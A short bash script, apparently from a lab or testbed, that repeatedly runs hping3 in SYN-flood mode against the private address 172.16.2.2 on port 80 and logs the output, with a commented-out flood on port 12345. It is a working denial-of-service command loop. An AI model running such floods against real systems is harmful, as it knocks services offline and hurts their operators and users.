#!/bin/bash
echo $$
x=0 
echo ====starthping==== >> /home/bayu/prog1.log 
while [ $x -le 60 ] 
do
        #echo ====starthping==== >> /home/bayu/prog1.log
        echo $x >> /home/bayu/prog1.log
        #hping3 --flood -d 1000 -p 12345 172.16.2.2
        hping3 --flood -d 250 --keep -S -p 80 172.16.2.2 >> /home/bayu/prog1.log
        sleep 0.500
        (( x++ ))
done


